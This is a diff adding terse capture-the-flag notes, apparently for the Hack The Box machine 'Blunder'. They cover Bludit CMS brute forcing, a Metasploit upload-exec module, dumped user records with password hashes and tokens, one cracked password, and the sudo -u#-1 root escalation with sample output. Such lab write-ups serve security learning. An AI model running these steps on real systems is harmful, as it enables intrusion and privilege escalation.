@@ -1,0 +1,70 @@
+bludit cms
+brute force vulnerable
+
+cewl -w wordlists.txt -d 10 -m 1 http://blunder.htb/
+
+msfconsole bludit_upload_images_exec
+
+"admin": {                                                            
+   "nickname": "Admin",                                              
+   "firstName": "Administrator",                                     
+   "lastName": "",                                                   
+   "role": "admin",                                                  
+   "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",           
+   "salt": "5dde2887e7aca",                                          
+   "email": "",                                                      
+   "registered": "2019-11-27 07:40:55",                              
+   "tokenRemember": "",                                              
+   "tokenAuth": "b380cb62057e9da47afce66b4615107d",                  
+   "tokenAuthTTL": "2009-03-15 14:00",                              
+
+"fergus": {                                                                 
+    "firstName": "a",                                                       
+    "lastName": "a",                                                        
+    "nickname": "a",                                                        
+    "description": "",                                                      
+    "role": "author",                                                       
+    "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",                 
+    "salt": "jqxpjfnv",                                                     
+    "email": "",                                                            
+    "registered": "2019-11-27 13:26:44",                                    
+    "tokenRemember": "",                                                    
+    "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",                        
+    "tokenAuthTTL": "2009-03-15 14:00",                                     
+
+{                                                                       
+    "admin": {                                                          
+        "nickname": "Hugo",                                             
+        "firstName": "Hugo",                                            
+        "lastName": "",                                                 
+        "role": "User",                                                 
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",         
+        "email": "",                                                    
+        "registered": "2019-11-27 07:40:55",                            
+        "tokenRemember": "",                                            
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",                
+        "tokenAuthTTL": "2009-03-15 14:00",                             
+        "twitter": "",                                                  
+
+faca404fd5c0a31cf1897b823c695c85cffeb98d:Password120
+
+(ALL, !root) /bin/bash                                                 
+
+With ALL specified, user hacker can run the binary /bin/bash as any user
+
+EXPLOIT: 
+
+sudo -u#-1 /bin/bash
+
+Example : 
+
+hacker@kali:~$ sudo -u#-1 /bin/bash
+root@kali:/home/hacker# id
+uid=0(root) gid=1000(hacker) groups=1000(hacker)
+root@kali:/home/hacker#
+
+Description :
+Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
+-u#-1 returns as 0 which is root's id
+
+and /bin/bash is executed with root permission
